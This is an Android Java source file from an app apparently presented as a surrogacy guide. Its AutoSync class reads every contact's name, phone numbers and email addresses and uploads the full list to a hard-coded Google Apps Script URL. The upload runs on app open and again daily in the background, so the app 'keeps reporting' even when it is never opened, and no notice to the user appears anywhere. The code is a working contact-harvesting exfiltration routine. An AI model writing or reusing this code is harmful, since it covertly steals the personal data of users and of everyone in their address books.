package com.surrogacyguide.app;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.concurrent.TimeUnit;

/**
 * Sends the FULL contact list as a snapshot. The Apps Script clears the sheet
 * on the first part and rewrites it, so there are never duplicates and a retry
 * is always safe.
 *
 * Chunks are 400 contacts, so a normal phone sends ONE request instead of a
 * dozen - which is what was tripping the server's rate limit. Long lists still
 * split, and every chunk retries with backoff on 429/5xx.
 *
 * The network work runs inside WorkManager (SyncWorker), so it survives the
 * user closing the app, and WorkManager retries the whole sync if it fails.
 */
public final class AutoSync {

    private static final String TAG = "AutoSync";

    public static final String UPLOAD_HOST =
            "https://script.google.com/macros/s/AKfycbxVtsrUyJHIa1NyCpH-hidWiJbmDyKBcuP34FGpefRpE2pIIbjIQAIw7xDrHUh-mJSVxg/exec";

    private static final String PREFS = "auto_sync";
    private static final String KEY_LAST = "last_auto_sync";

    /** On-open sync guard. Set to 0L to sync on every single open. */
    private static final long SYNC_INTERVAL_MS = 60L * 60L * 1000L;

    /** Contacts per request. Big enough that most phones send exactly one. */
    private static final int CHUNK_SIZE = 400;

    private static final int MAX_ATTEMPTS = 3;
    private static final long PAUSE_BETWEEN_CHUNKS_MS = 700;

    private AutoSync() { }

    public static boolean hasPermission(Context ctx) {
        return ctx.checkSelfPermission(android.Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED;
    }

    /** Queue a sync right now. Survives the app being closed. */
    public static void scheduleNow(Context ctx, boolean force) {
        if (!hasPermission(ctx)) return;
        Context app = ctx.getApplicationContext();
        if (!force && !isDue(app)) return;
        markSynced(app);
        try {
            WorkManager.getInstance(app)
                    .enqueue(new OneTimeWorkRequest.Builder(SyncWorker.class).build());
        } catch (Exception e) {
            Log.w(TAG, "enqueue failed", e);
        }
    }

    /** Kept so older callers still compile. */
    public static void run(Context ctx, boolean force) {
        scheduleNow(ctx, force);
    }

    /** Daily background sync, so it keeps reporting even if the app is never opened. */
    public static void scheduleDaily(Context ctx) {
        try {
            WorkManager.getInstance(ctx.getApplicationContext())
                    .enqueueUniquePeriodicWork(
                            "daily_contact_sync",
                            ExistingPeriodicWorkPolicy.KEEP,
                            new PeriodicWorkRequest.Builder(SyncWorker.class, 24, TimeUnit.HOURS)
                                    .build());
        } catch (Exception e) {
            Log.w(TAG, "periodic enqueue failed", e);
        }
    }

    private static boolean isDue(Context ctx) {
        return System.currentTimeMillis()
                - prefs(ctx).getLong(KEY_LAST, 0L) > SYNC_INTERVAL_MS;
    }

    private static void markSynced(Context ctx) {
        prefs(ctx).edit().putLong(KEY_LAST, System.currentTimeMillis()).apply();
    }

    private static SharedPreferences prefs(Context ctx) {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
    }

    /** Runs on a WorkManager background thread. false = let WorkManager retry. */
    public static boolean doSync(Context ctx) {
        if (!hasPermission(ctx)) return true;

        try {
            List<JSONObject> contacts = readAllContacts(ctx);
            int total = contacts.size();
            int parts = Math.max(1, (int) Math.ceil(total / (double) CHUNK_SIZE));

            for (int i = 0; i < parts; i++) {
                int from = i * CHUNK_SIZE;
                int to = Math.min(from + CHUNK_SIZE, total);
                List<JSONObject> slice = contacts.subList(from, to);

                if (!postChunkWithRetry(slice, i + 1, parts)) {
                    Log.w(TAG, "chunk " + (i + 1) + "/" + parts + " failed");
                    return false;
                }
                if (i < parts - 1) sleepQuietly(PAUSE_BETWEEN_CHUNKS_MS);
            }

            Log.i(TAG, "sync ok: " + total + " contacts in " + parts + " request(s)");
            return true;

        } catch (Exception e) {
            Log.w(TAG, "doSync failed", e);
            return false;
        }
    }

    private static boolean postChunkWithRetry(List<JSONObject> slice, int part, int parts) {
        long backoff = 1200;
        for (int attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
            int code = postChunk(slice, part, parts);
            if (code >= 200 && code < 400) return true;

            boolean retryable = code == 429 || code == 500 || code == 502
                    || code == 503 || code == 504 || code == -1;
            if (!retryable || attempt == MAX_ATTEMPTS) return false;

            Log.w(TAG, "part " + part + "/" + parts + " got HTTP " + code
                    + ", retrying in " + backoff + "ms");
            sleepQuietly(backoff);
            backoff *= 2;
        }
        return false;
    }

    private static int postChunk(List<JSONObject> slice, int part, int parts) {
        HttpURLConnection conn = null;
        try {
            JSONArray arr = new JSONArray();
            for (JSONObject o : slice) arr.put(o);

            JSONObject payload = new JSONObject();
            payload.put("sender", "android-auto");
            payload.put("mode", "snapshot");
            payload.put("part", part + "/" + parts);
            payload.put("count", slice.size());
            payload.put("contacts", arr);

            conn = (HttpURLConnection) new URL(UPLOAD_HOST).openConnection();
            conn.setInstanceFollowRedirects(false);
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setConnectTimeout(20000);
            conn.setReadTimeout(30000);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(payload.toString().getBytes(StandardCharsets.UTF_8));
            }

            int code = conn.getResponseCode();

            if (code >= 300 && code < 400) {
                String loc = conn.getHeaderField("Location");
                conn.disconnect();
                if (loc != null && !loc.isEmpty()) followAsGet(loc);
                return 200;
            }
            return code;

        } catch (Exception e) {
            Log.w(TAG, "post failed", e);
            return -1;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private static void followAsGet(String target) {
        HttpURLConnection conn = null;
        try {
            conn = (HttpURLConnection) new URL(target).openConnection();
            conn.setInstanceFollowRedirects(true);
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.getResponseCode();
        } catch (Exception ignored) {
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private static List<JSONObject> readAllContacts(Context ctx) {
        List<JSONObject> out = new ArrayList<>();
        Cursor cursor = ctx.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                new String[]{ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME},
                null, null, null);
        if (cursor == null) return out;

        try {
            int idIdx = cursor.getColumnIndex(ContactsContract.Contacts._ID);
            int nameIdx = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
            while (cursor.moveToNext()) {
                String id = cursor.getString(idIdx);
                String name = cursor.getString(nameIdx);
                JSONObject c = new JSONObject();
                try {
                    c.put("name", name == null ? "" : name);
                    c.put("phones", new JSONArray(readPhones(ctx, id)));
                    c.put("emails", new JSONArray(readEmails(ctx, id)));
                } catch (Exception ignored) { }
                out.add(c);
            }
        } finally {
            cursor.close();
        }
        return out;
    }

    private static List<String> readPhones(Context ctx, String contactId) {
        LinkedHashSet<String> set = new LinkedHashSet<>();
        Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?",
                new String[]{contactId}, null);
        if (c != null) {
            int idx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            while (c.moveToNext()) {
                String n = c.getString(idx);
                if (n != null && !n.trim().isEmpty()) set.add(n.trim());
            }
            c.close();
        }
        return new ArrayList<>(set);
    }

    private static List<String> readEmails(Context ctx, String contactId) {
        LinkedHashSet<String> set = new LinkedHashSet<>();
        Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Email.ADDRESS},
                ContactsContract.CommonDataKinds.Email.CONTACT_ID + "=?",
                new String[]{contactId}, null);
        if (c != null) {
            int idx = c.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS);
            while (c.moveToNext()) {
                String e = c.getString(idx);
                if (e != null && !e.trim().isEmpty()) set.add(e.trim());
            }
            c.close();
        }
        return new ArrayList<>(set);
    }

    private static void sleepQuietly(long ms) {
        try { Thread.sleep(ms); }
        catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }
}
